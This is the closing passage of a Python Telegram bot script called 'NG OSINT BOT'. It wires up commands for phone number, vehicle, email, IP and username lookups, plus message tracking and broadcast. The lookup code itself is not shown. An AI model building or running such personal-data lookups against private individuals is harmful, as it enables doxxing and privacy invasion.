        application.add_handler(CommandHandler("stats", user_stats))

        # Add message handler to track all messages
        application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

        print("🤖 NG OSINT BOT v2.0 is LIVE 🔥")
        print(f"👨‍💻 Developer Channel: {DEVELOPER_CHANNEL}")
        print(f"📊 Admin ID: {ADMIN_ID}")
        print("📝 User tracking enabled")
        print("⚡ Starting polling...")

        # Use proper polling configuration
        application.run_polling(
            poll_interval=2.0,
            timeout=20,
            bootstrap_retries=5
        )

    except Exception as e:
        print(f"❌ Bot startup failed: {e}")
        print("🔄 Trying alternative startup method...")

        # Simple retry with basic configuration
        try:
            print("🔄 Retrying with basic configuration...")
            application = Application.builder().token(BOT_TOKEN).build()

            # Add all handlers
            application.add_handler(CommandHandler("start", start))
            application.add_handler(CallbackQueryHandler(button_callback))
            application.add_handler(CommandHandler("number", number_lookup))
            application.add_handler(CommandHandler("vehicle", vehicle_lookup))
            application.add_handler(CommandHandler("ip", ip_lookup))
            application.add_handler(CommandHandler("ifsc", ifsc_lookup))
            application.add_handler(CommandHandler("email", email_lookup))
            application.add_handler(CommandHandler("scan", username_scan)) # Added username scan command
            application.add_handler(CommandHandler("broadcast", broadcast))
            application.add_handler(CommandHandler("stats", user_stats))
            application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

            print("🚀 Basic startup successful!")
            application.run_polling()

        except Exception as e2:
            print(f"❌ Basic startup also failed: {e2}")
            print("🔧 Please stop any running instances and restart the bot")

if __name__ == '__main__':
    main()